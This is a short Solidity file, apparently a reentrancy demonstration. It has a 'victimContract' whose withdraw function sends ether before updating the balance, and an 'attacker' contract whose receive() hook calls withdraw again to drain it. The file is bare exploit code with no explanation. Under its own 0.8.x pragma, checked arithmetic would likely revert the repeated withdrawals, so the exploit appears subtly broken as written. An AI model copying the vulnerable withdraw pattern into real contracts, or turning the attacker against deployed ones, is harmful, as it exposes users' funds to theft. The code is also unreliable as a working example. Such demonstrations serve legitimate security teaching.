// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract victimContract {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Not enough balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
    }
}

contract attacker {
    address public victimAddress;

    function setVictimAddress(address _victimAddress) public {
        victimAddress = _victimAddress;
    }

    function deposit(address victim) public payable {
        victimContract(victim).deposit{value: msg.value}();
    }

    receive() external payable {
        if (msg.sender.balance > 0) {
            victimContract(msg.sender).withdraw(0.5 ether);
        }
    }

    function withdraw(address victim) public {
        victimContract(victim).withdraw(0.5 ether);
    }
}
